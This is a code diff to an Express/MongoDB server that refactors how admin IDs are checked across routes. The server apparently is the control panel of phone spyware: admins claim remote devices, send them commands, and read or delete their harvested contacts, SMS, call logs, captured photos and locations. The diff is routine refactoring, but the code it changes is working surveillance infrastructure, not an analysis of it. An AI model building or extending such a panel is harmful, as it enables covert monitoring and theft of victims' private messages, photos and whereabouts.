@@ -141,6 +141,15 @@ const authMiddleware = async (req, res, next) => {
   }
 };
 
+// Convert string id to ObjectId for MongoDB queries
+const toObjectId = (id) => {
+  try {
+    return mongoose.Types.ObjectId(id);
+  } catch (e) {
+    return id;
+  }
+};
+
 // Socket.IO - Device Communication
 io.use(async (socket, next) => {
   const { deviceId, type } = socket.handshake.query;
@@ -627,17 +636,23 @@ const AccessRequestSchema = new mongoose.Schema({
 });
 const AccessRequest = mongoose.model('AccessRequest', AccessRequestSchema);
 
+const getAdminId = (req) => {
+  if (!req.adminId) return null;
+  return typeof req.adminId === 'string' ? req.adminId : req.adminId.toString();
+};
+
 // Get all devices (owned + unassigned) for admins to claim
 app.get('/api/devices/all', authMiddleware, async (req, res) => {
   try {
     const allDevices = await Device.find({}).sort({ lastSeen: -1 }).lean();
+    const adminId = getAdminId(req);
     const owned = [];
     const unassigned = [];
     allDevices.forEach(d => {
       if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
       if (d.adminId == null || d.adminId === '' || d.adminId === undefined) {
         unassigned.push(d);
-      } else if (d.adminId === req.adminId) {
+      } else if (d.adminId === adminId) {
         owned.push(d);
       }
     });
@@ -726,11 +741,12 @@ app.post('/api/access-requests/:requestId', authMiddleware, async (req, res) => 
 // Devices Routes
 app.get('/api/devices', authMiddleware, async (req, res) => {
   try {
-        // Show devices owned by admin OR shared with admin
+    const adminId = getAdminId(req);
+    // Show devices owned by admin OR shared with admin
     const devices = await Device.find({
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     }).sort({ lastSeen: -1 }).lean();
     // Normalize data Map
@@ -745,11 +761,12 @@ app.get('/api/devices', authMiddleware, async (req, res) => {
 
 app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
+    const adminId = getAdminId(req);
     const device = await Device.findOne({
       deviceId: req.params.deviceId,
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
@@ -765,11 +782,12 @@ app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
 app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
   try {
     const { type, params } = req.body;
+    const adminId = getAdminId(req);
     const device = await Device.findOne({
       deviceId: req.params.deviceId,
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     });
     if (!device) return res.status(404).json({ error: 'Device not found or no access' });
@@ -799,11 +817,12 @@ app.get('/api/devices/:deviceId/search/contacts', authMiddleware, async (req, re
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
+    const adminId = getAdminId(req);
     const device = await Device.findOne({
       deviceId,
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
@@ -826,11 +845,12 @@ app.get('/api/devices/:deviceId/search/sms', authMiddleware, async (req, res) =>
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
+    const adminId = getAdminId(req);
     const device = await Device.findOne({
       deviceId,
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
@@ -853,11 +873,12 @@ app.get('/api/devices/:deviceId/search/callLogs', authMiddleware, async (req, re
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
+    const adminId = getAdminId(req);
     const device = await Device.findOne({
       deviceId,
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
@@ -903,7 +924,8 @@ app.post('/api/upload', authMiddleware, upload.single('file'), async (req, res) 
 // ===== DELETE DEVICE =====
 app.delete('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
-    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId, adminId: req.adminId });
+    const adminId = getAdminId(req);
+    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId, adminId });
     if (!device) return res.status(404).json({ error: 'Device not found' });
     io.emit('device:offline', { deviceId: req.params.deviceId });
     res.json({ success: true, message: 'Device deleted' });
@@ -919,7 +941,8 @@ app.delete('/api/devices/:deviceId/data/:dataType/:itemId', authMiddleware, asyn
     if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations'].includes(dataType)) {
       return res.status(400).json({ error: 'Invalid data type' });
     }
-    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+    const adminId = getAdminId(req);
+    const device = await Device.findOne({ deviceId, adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     
     const dataKey = `data.${dataType}`;
@@ -947,10 +970,11 @@ app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, 
     if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations', 'installedApps', 'lastPhoto'].includes(dataType)) {
       return res.status(400).json({ error: 'Invalid data type' });
     }
-    
+    const adminId = getAdminId(req);
+
     // If capturedPhotos, also delete from Cloudinary
     if (dataType === 'capturedPhotos') {
-      const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+      const device = await Device.findOne({ deviceId, adminId }).lean();
       if (device?.data?.capturedPhotos) {
         const photos = device.data.capturedPhotos instanceof Map 
           ? Array.from(device.data.capturedPhotos.values()) 
@@ -963,14 +987,14 @@ app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, 
       }
     }
     if (dataType === 'lastPhoto') {
-      const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+      const device = await Device.findOne({ deviceId, adminId }).lean();
       if (device?.data?.lastPhoto?.publicId) {
         try { await cloudinary.uploader.destroy(device.data.lastPhoto.publicId); } catch (e) {}
       }
     }
     
     const result = await mongoose.connection.db.collection('devices').updateOne(
-      { deviceId, adminId: req.adminId },
+      { deviceId, adminId },
       { $unset: { [`data.${dataType}`]: '' } }
     );
     
@@ -988,7 +1012,8 @@ app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
     
     if (!publicId) {
       // Delete all media of this type for device
-      const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
+      const adminId = getAdminId(req);
+      const device = await Device.findOne({ deviceId, adminId }).lean();
       if (!device) return res.status(404).json({ error: 'Device not found' });
       
       const dataField = type === 'photos' || type === 'capturedPhotos' ? 'capturedPhotos' : 
@@ -1013,7 +1038,7 @@ app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
       
       // Clear from DB
       const updateResult = await Device.updateOne(
-        { deviceId, adminId: req.adminId },
+        { deviceId, adminId },
         { $set: { [`data.${dataField}`]: [] } }
       );
       if (updateResult.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
@@ -1032,7 +1057,7 @@ app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
       
       if (dataField) {
         const updateResult2 = await Device.updateOne(
-          { deviceId, adminId: req.adminId },
+          { deviceId, adminId },
           { $pull: { [`data.${dataField}`]: { publicId } } }
         );
         if (updateResult2.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
@@ -1053,9 +1078,10 @@ app.post('/api/devices/:deviceId/assign', authMiddleware, async (req, res) => {
     if (device.adminId != null && device.adminId !== '' && device.adminId !== undefined) {
       return res.status(400).json({ error: 'Device already assigned to another admin' });
     }
+    const adminId = getAdminId(req);
     const updated = await Device.findOneAndUpdate(
       { deviceId: req.params.deviceId },
-      { $set: { adminId: req.adminId } },
+      { $set: { adminId } },
       { new: true }
     );
     res.json({ success: true, device: updated });
@@ -1074,11 +1100,12 @@ app.delete('/api/media/:deviceId/:type/:publicId', authMiddleware, async (req, r
       await cloudinary.uploader.destroy(publicId);
     } catch (e) {}
     
-    const dataField = 'capturedPhotos';
-    const updateResult3 = await Device.updateOne(
-      { deviceId: req.params.deviceId, adminId: req.adminId },
-      { $pull: { [`data.${dataField}`]: { publicId } } }
-    );
+      const adminId = getAdminId(req);
+      const dataField = 'capturedPhotos';
+      const updateResult3 = await Device.updateOne(
+        { deviceId: req.params.deviceId, adminId },
+        { $pull: { [`data.${dataField}`]: { publicId } } }
+      );
     if (updateResult3.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
     
     res.json({ success: true });
@@ -1297,11 +1324,12 @@ app.get('/api/stats', authMiddleware, async (req, res) => {
 app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
   try {
     const { deviceId, dataType } = req.params;
+    const adminId = getAdminId(req);
     const device = await Device.findOne({
       deviceId,
       $or: [
-        { adminId: req.adminId },
-        { sharedWith: req.adminId }
+        { adminId },
+        { sharedWith: adminId }
       ]
     }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
